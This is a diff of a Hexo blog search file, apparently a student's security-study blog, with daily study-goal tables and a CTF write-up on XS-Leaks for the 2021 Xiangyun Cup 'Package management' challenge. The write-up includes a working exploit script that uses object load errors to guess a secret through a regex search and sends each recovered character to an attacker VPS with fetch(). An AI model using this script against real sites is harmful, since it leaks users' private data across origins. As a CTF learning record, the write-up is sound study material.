@@ -329,19 +329,97 @@
     <content><![CDATA[<h1 id="learn-month2"><a href="#learn-month2" class="headerlink" title="learn-month2"></a>learn-month2</h1><p>第二月的学习记录</p>
 <span id="more"></span>
 
-<h2 id="day1-–-4-12"><a href="#day1-–-4-12" class="headerlink" title="day1 – 4.12"></a>day1 – 4.12</h2><h3 id="goals"><a href="#goals" class="headerlink" title="goals"></a>goals</h3><ul>
-<li>听一节汇编课</li>
-<li>听 pwn.college 第二课时</li>
-<li>复现一下 xs-leak 的小技巧</li>
-<li>有空填一下 srtp</li>
-</ul>
-<h2 id="day2-–-4-13"><a href="#day2-–-4-13" class="headerlink" title="day2 – 4.13"></a>day2 – 4.13</h2><ul>
-<li>听一节汇编课</li>
-<li>继续 pwn.college 第二课时</li>
-<li>学一下 FTP 相关漏洞</li>
-<li>继续复现LineCTF</li>
-<li>改 srtp 申报表</li>
-</ul>
+<h2 id="day1-–-4-12"><a href="#day1-–-4-12" class="headerlink" title="day1 – 4.12"></a>day1 – 4.12</h2><table>
+<thead>
+<tr>
+<th>mission</th>
+<th>achieve</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>听一节汇编课</td>
+<td>Y</td>
+</tr>
+<tr>
+<td>学习 pwn.college 第二课时</td>
+<td>Y</td>
+</tr>
+<tr>
+<td>学习 xs-leak 的小技巧</td>
+<td>Y</td>
+</tr>
+</tbody></table>
+<h2 id="day2-–-4-13"><a href="#day2-–-4-13" class="headerlink" title="day2 – 4.13"></a>day2 – 4.13</h2><table>
+<thead>
+<tr>
+<th>mission</th>
+<th>是否完成</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>听一节汇编课</td>
+<td>Y</td>
+</tr>
+<tr>
+<td>继续 pwn.college 第二课时</td>
+<td>Y</td>
+</tr>
+<tr>
+<td>继续复现LineCTF</td>
+<td>N</td>
+</tr>
+<tr>
+<td>改 srtp 申报表</td>
+<td>N</td>
+</tr>
+</tbody></table>
+<h2 id="day3-–-4-14"><a href="#day3-–-4-14" class="headerlink" title="day3 – 4.14"></a>day3 – 4.14</h2><table>
+<thead>
+<tr>
+<th>misssion</th>
+<th>achieve</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结束汇编寄存器学习</td>
+<td></td>
+</tr>
+<tr>
+<td>datawhale数据结构</td>
+<td></td>
+</tr>
+<tr>
+<td>预习计组实验</td>
+<td></td>
+</tr>
+<tr>
+<td>xsleak写一篇文章</td>
+<td></td>
+</tr>
+<tr>
+<td>pwn.college 第二course 拓展阅读</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="长期任务"><a href="#长期任务" class="headerlink" title="长期任务"></a>长期任务</h2><table>
+<thead>
+<tr>
+<th align="left">任务</th>
+<th>计划完成时间</th>
+<th>是否完成</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">FTP相关漏洞</td>
+<td>五一假期结束之前</td>
+<td></td>
+</tr>
+<tr>
+<td align="left">srtp申请</td>
+<td>4.18之前</td>
+<td></td>
+</tr>
+</tbody></table>
 ]]></content>
       <categories>
         <category>learn</category>
@@ -417,7 +495,7 @@
     <content><![CDATA[<p>打算把 <a href="http://xsleak.dev/">http://xsleak.dev</a> 上的知识点全部过一遍 顺便找对应的题目来复现一下</p>
 <span id="more"></span>
 
-<h1 id="祥云杯2021-–-Package-management"><a href="#祥云杯2021-–-Package-management" class="headerlink" title="祥云杯2021 – Package management"></a>祥云杯2021 – Package management</h1><p>有bot 典型的 xsleak</p>
+<h1 id="祥云杯2021-–-Package-management"><a href="#祥云杯2021-–-Package-management" class="headerlink" title="祥云杯2021 – Package management"></a>祥云杯2021 – Package management</h1><h2 id="content"><a href="#content" class="headerlink" title="content"></a>content</h2><p>有bot 典型的 xsleak</p>
 <p>先看一下 csp</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req: Request, res: Response, next: NextFunction</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">session</span> = req.<span class="property">session</span>;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">csrfToken</span> = req.<span class="title function_">csrfToken</span>();</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">&quot;default-src &#x27;none&#x27;;style-src &#x27;self&#x27; &#x27;sha256-GQNllb5OTXNDw4L6IIESVZXrXdsfSA9O8LeoDwmVQmc=&#x27;;img-src &#x27;self&#x27;;form-action &#x27;self&#x27;;base-uri &#x27;none&#x27;;&quot;</span>);</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;X-Content-Type-Options&#x27;</span>,<span class="string">&#x27;nosniff&#x27;</span>);</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
@@ -462,6 +540,14 @@
 <p>代码 来自 <a href="https://www.scuctf.com/ctfwiki/web/9.xss/xsleaks/">https://www.scuctf.com/ctfwiki/web/9.xss/xsleaks/</a></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> <span class="variable constant_">VPS_IP</span> = <span class="string">&#x27;http://*&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> <span class="title function_">escape</span> = (<span class="params">c</span>) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> c.<span class="title function_">replace</span>(<span class="regexp">/[.*+?^=!:$&#123;&#125;()|[\]\/\\]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> <span class="title function_">oracle</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">const</span> object = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;object&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            object.<span class="property">data</span> = url;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            object.<span class="property">onload</span> = resolve;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            object.<span class="property">onerror</span> = reject;  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(object);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> <span class="title function_">search</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">try</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">await</span> <span class="title function_">oracle</span>(url)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">return</span> <span class="literal">true</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125; <span class="keyword">catch</span> (e) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    (<span class="keyword">async</span> () =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">let</span> flag = <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">let</span> url = <span class="string">`http://localhost:8000/packages/list?search[description][$regex]=^<span class="subst">$&#123;flag&#125;</span>`</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">while</span> (flag.<span class="title function_">charAt</span>(flag.<span class="property">length</span> - <span class="number">1</span>) !== <span class="string">&quot;&#125;&quot;</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">for</span> ( <span class="keyword">let</span> i <span class="keyword">of</span> chars ) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">if</span> ( <span class="title function_">await</span>(<span class="title function_">search</span>(url + <span class="built_in">escape</span>(i))) ) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                url = url + <span class="built_in">escape</span>(i)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                flag += i</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;VPS_IP&#125;</span>/?flag=<span class="subst">$&#123;flag&#125;</span>`</span>, &#123;<span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>&#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;   <span class="keyword">else</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;failed&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;)();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://deelay.me/10000/http://example.com&quot;</span>/&gt;</span></span></span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure>
 
+
+
+
+
+<h2 id="about-object-and-cache"><a href="#about-object-and-cache" class="headerlink" title="about object and cache"></a>about object and cache</h2><p>打算再写一篇blog记录一下</p>
+<p><a href="https://portswigger.net/daily-swig/new-xs-leak-techniques-reveal-fresh-ways-to-expose-user-information">https://portswigger.net/daily-swig/new-xs-leak-techniques-reveal-fresh-ways-to-expose-user-information</a></p>
+<p><a href="https://infosecwriteups.com/cross-site-content-and-status-types-leakage-ef2dab0a492">https://infosecwriteups.com/cross-site-content-and-status-types-leakage-ef2dab0a492</a></p>
+<p><a href="https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html">https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html</a></p>
 ]]></content>
       <categories>
         <category>web</category>
